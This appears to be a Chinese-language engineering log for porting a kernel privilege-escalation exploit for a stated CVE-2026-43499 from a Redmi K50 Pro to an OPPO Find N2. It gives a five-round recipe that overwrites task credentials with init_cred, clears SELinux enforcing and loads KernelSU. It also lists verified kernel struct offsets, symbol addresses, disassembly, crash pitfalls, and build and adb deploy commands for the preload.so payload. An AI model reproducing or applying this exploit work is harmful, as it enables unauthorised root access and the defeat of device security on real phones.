# matisse 路线移植记录 (exploit-v29)

> 2026-10-04 · 从 `ihamn/matisse-public`(GPL-3.0)移植到 OPPO Find N2 / PGU110 / SM8475 / kernel 5.10.236

## 0. 为什么换路线:KGSL/cheese 已证伪

| 试验 | 次数 | 命中 |
|---|---|---|
| `CHEESE_PHYADDR` 注入(OPPO 高段/低段采样) | 12 | 0 |
| 原生全量扫描(源机 256 个地址) | 219 | 0 |
| **合计** | **231** | **0** |

源机 256 个地址全部落在 OPPO 高段 [32–46GB] 内,若机制生效理论上应有 ~25% 命中。
`0.75^231 ≈ 10^-29` → **不是地址挑错,是 GPU 侧机制在 OPPO 上根本没生效**。
旁证(OPPO 内核源码 `drivers/gpu/msm/`):exploit 的 PM4 载荷字数与本代 CP 期望不符
(`CP_SMMU_TABLE_UPDATE` exploit cnt=4 vs 驱动 cnt=3;`CP_MEM_WRITE` 3 vs 5)。

**结论:放弃 KGSL/cheese,改走 matisse 路线。**

## 1. matisse 是什么

`ihamn/matisse-public` —— Redmi K50 Pro(matisse / MT6983 MediaTek)/ kernel 5.10.209,
**同一个 GhostLock(CVE-2026-43499)家族、同一套上游框架**(`common.h / fops.c / main.c /
pipe.c / root.c / slide.c / su_daemon.c / util.c / offset.h / targets/` 与 `exploit/` 逐一对应),
**并且已在真机上取得 `uid=0` + kernel SID + KernelSU late-load,全程未崩机**。

### 取胜配方(五轮)

```
R 轮   task->real_cred = init_cred          (rb_erase 受控写:STORE(a) *(pc+8)=right)
E5 轮  selinux_state+0(enforcing) 清零      (pi_tree 几何,写值 0 → Permissive)
C 轮   task->cred = init_cred               (→ 真 uid=0)
gate   真 uid=0 那一刻 system("sh ksu_go.sh &") → ksud late-load 装 KernelSU
HOLD   PSELECT_HOLD=1 持毒进程常驻不退
```

### 四个硬坑(均有实测根因)

1. `finit_module` 必失败(fd 被 prep churn ⇒ EBADF / SELinux 拒)⇒ 走官方 `ksud late-load`。
2. exec 必须插在 **gate(真 uid=0)**,不能插在 R 阶段(否则 `ksu_go.log` 里是 `uid=2000`)。
3. C 落地后进程 `_exit` ⇒ mm teardown ⇒ `lock_page_memcg`/`page_remove_rmap` panic ⇒ **必须 HOLD**。
4. HOLD 后 cred=`init_cred`,**任何 SIGKILL 等同杀 init**(`Attempted to kill init`)⇒ 拔掉所有 kill 路径。

## 2. 我方旧代码缺的东西(精确对表)

| 机制 | matisse | `exploit/`(旧) |
|---|---|---|
| v29 `block_holder` 三互斥锁**深 PI 链** | ✓ | ❌ —— 没有它 `owner->pi_blocked_on==NULL`,`rt_mutex_adjust_prio_chain` 单层走链,**Call 2/3 永不执行** |
| `tree_right`/`tree_left`/`task`/`lock` 词 + 正确基址(**0/3/8**) | ✓ | ❌ 基址 2/5/10,且**缺 `tree_right`(要写入的值)** |
| `perf_find_task()` perf 泄露 task/cred | ✓ | ❌ |
| 真 CVE 路径 `slide_v37_trigger`(WAIT_REQUEUE_PI + CMP_REQUEUE_PI) | ✓ 启用 | ❌ **`slide.c` 被整个弃用**("架构性死路") |
| setsockopt 512B stamp(v37/mt20,取代 pselect 覆盖) | ✓ | ❌ |
| `PSELECT_PTR_MODE`(先 real_cred 后 cred) | ✓ | ❌ |
| `PSELECT_HOLD` / E5-ENF 几何 / PTR_STRICT AND-gate | ✓ | ❌ |
| `PSELECT_ROUTE_NFDS` | 320 | 640 |

## 3. 已用 OPPO 自己的内核库(output.elf)实测确认的值

所有值均由 `.symtab`(143,599 符号)或反汇编读出,非猜测。

### 3.1 cred 指针:旧值错 0xa0

```asm
; commit_creds @ 0xffffffc008186784
mrs  x20, sp_el0
ldr  x19, [x20, #0x778]      ; task->real_cred
ldr  x8,  [x20, #0x780]      ; task->cred
cmp  x8, x19
b.ne -> brk #0x800           ; BUG_ON(cred != real_cred)
; prepare_creds @ 0xffffffc008186070
ldr  x20, [curtask, #0x780]  ; current->cred
```
`task+0x770 = ptracer_cred`(matisse 现场实证),`0x778 = real_cred`,`0x780 = cred`。

| | 旧 target.h | 实测 |
|---|---|---|
| `TASK_REAL_CRED_OFF` | 0x818 ❌ | **0x778** |
| `TASK_CRED_OFF` | 0x820 ❌ | **0x780** |
| `CRED_UID_OFF` | 8 ❌ | **4**(0x8 是 gid+suid) |
| `CRED_SECUREBITS_OFF` | 40 ❌ | **0x24** |
| `CRED_CAPS_OFF` | 48 ❌ | **0x28**(cap_inheritable) |

`commit_creds` 在 `+0x14/+0x18/+0x1c/+0x20` 比较 32 位身份字段(euid/egid/fsuid/fsgid),
故 uid 块从 0x04 起;`sizeof(cred)=0xa8`,`cred->security@0x80` 一致。

### 3.2 `struct rt_mutex_waiter`:matisse 的 0x44 不适用于本机

```asm
; task_blocks_on_rt_mutex @ 0xffffffc0081ecaf0
stp  x20, x19, [x22, #0x30]  ; waiter->task@0x30, waiter->lock@0x38
str  w8,  [x22, #0x40]       ; waiter->prio@0x40      ← matisse 写的是 0x44
str  x8,  [x22, #0x48]       ; waiter->deadline@0x48
str  x22, [x20, #0x898]      ; task->pi_blocked_on = waiter
; rt_mutex_adjust_prio_chain @ 0xffffffc0081ed8ec
ldr  x28, [x19, #0x898]; ldr [x28,#0x38](lock); ldr w9,[x28,#0x40](prio)
```
→ `{tree_entry@0x00, pi_tree_entry@0x18, task@0x30, lock@0x38, prio@0x40, pad@0x44,
deadline@0x48}`,`sizeof = 0x50`。**本机无 `wake_state`/`ww_ctx`。**
⇒ `fops.c` 的 word 8 必须是 **`prio_val`(低 dword)**,不能用 matisse 的 `(prio<<32)|3`
(那会把 prio 写成 3、真值写进 padding)。已在代码中按 `WAITER_WAKE_STATE_OFF` 条件编译。

### 3.3 SELinux enforcing 在 `state+0`,不是 `state+1`

```asm
; avc_denied @ 0xffffffc0088fc49c
ldarb w12, [x0]        ; x0 = selinux_state
tbz   w12, #0          ; bit0==0 → allow
```
⇒ `SELINUX_ENFORCING_OFF = SELINUX_STATE_OFF + 0`。
(旧 target.h 的 `0x02774c84` 是 `selinux_enforcing_boot`,另一个变量,E5 不用它。)

### 3.4 file_operations 三处"错位一个函数"

| 旧值 | 实际符号 | 正确值 |
|---|---|---|
| `COPY_SPLICE_READ_OFF 0x5e6830` | `iter_file_splice_write`(**写**函数) | `generic_file_splice_read` **0x5e6c68** |
| `CONFIGFS_READ_ITER_OFF 0x6b038c` | `configfs_hash_and_remove+0x4a4` | `configfs_read_bin_file` **0x6b0d0c** |
| `CONFIGFS_BIN_WRITE_ITER_OFF 0x6b050c` | `configfs_read_file` | `configfs_write_bin_file` **0x6b0f84** |

### 3.5 语义澄清:`ASHMEM_MISC_FOPS` 是**写入目标**,不是表地址

`miscdevice { int minor; char *name; fops*; }` → `fops` 在 `+0x10`。
旧 target.h 把 `ASHMEM_MISC_FOPS_OFF` 设成 `ashmem_fops` 表地址(0x22c0048),
与本框架"覆盖 misc 设备的 fops 指针"的用法不是一回事。
本机 `ashmem_misc` 符号 @ `0x0291a8d8` ⇒ 写入目标 = `0x0291a8d8 + 0x10`。

### 3.6 符号表(实测,供复查)

```
_text                 0x0000000000    init_task       0x027cc000    init_cred   0x027e0be0
__entry_task          0x027872f8      __per_cpu_offset 0x027ba5d8   root_task_group 0x029c8040
selinux_state         0x02a793c8      selinux_blob_sizes 0x02302bc0 security_hook_heads 0x02302528
kmalloc_caches        0x02302060      anon_pipe_buf_ops 0x0216aa68  noop_llseek 0x0056cf68
generic_file_splice_read 0x005e6c68   ashmem_fops     0x022c0048    ashmem_misc 0x0291a8d8
configfs_bin_file_operations 0x02175920   configfs_read_bin_file 0x006b0d0c
configfs_write_bin_file 0x006b0f84   nfulnl_logger 0x027c14b8
ashmem{llseek,read_iter,ioctl,compat_ioctl,mmap,open,release,show_fdinfo}
   = 0x011ee5d4 / 0x011ee6ec / 0x011ee7d0 / 0x011ef2e0 / 0x011ef340 / 0x011ef580 / 0x011ef620 / 0x011ef744
```

## 4. 仍需上机标定(唯一真正的未知)

- `PSELECT_ROUTE_NFDS` + word `shift`(fd_set ↔ rt_mutex_waiter 的栈对齐)。
  matisse = 320/0(且 `PSELECT_SHIFT` 只有 0 被内核读到过);本机待扫。
- 新版 stamp 用 **setsockopt 512B**(本机需确认落地槽位)。
- `perf_event_open` 在 shell(uid 2000)身份下是否可用。
- `FAKE_WAITER_*` / `FAKE_TASK_*`(页面内伪造结构)尚未在本机验证。

## 5. 目录与构建

```
exploit-v29/                      ← 本次移植(matisse 框架 + OPPO target)
  Makefile                        PROJECT ?= oppo-find_n2
  assets/wallpaper.webp
  src/{main,util,slide,fops,pipe,root,preload,su_daemon}.c  su_blob.S  wallpaper_blob.S
  src/common.h                    (含 LOCK_OFF 0x1350 / W0_OFF 0x2220)
  src/targets/oppo-find_n2/target.h   ← 本机偏移,每个值都标了来源
  src/targets/…                    (其他机型 target 已移除)
exploit/                          ← 旧框架,保留作参考(slide.c 已弃用)
```

```bash
# 构建(需要 NDK r29;本机无 NDK,见 §6)
cd exploit-v29
make PROJECT=oppo-find_n2 NDK_ROOT=<ndk> SHA256SUM=sha256sum
# 产物 build/oppo-find_n2/bin/preload.so

# 部署
adb push build/oppo-find_n2/bin/preload.so /data/local/tmp/
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/ls /dev/null'
```

## 6. 本机工具链状态

本机(Windows)无 clang/gcc/make/NDK。NDK r29 (windows) 已下载至
`C:\Users\L1872\Desktop\oppo-2\android-ndk-r29-windows.zip`。
`perf_event_open`/几何标定需设备在线(serial `84cb96e2`,已连接)。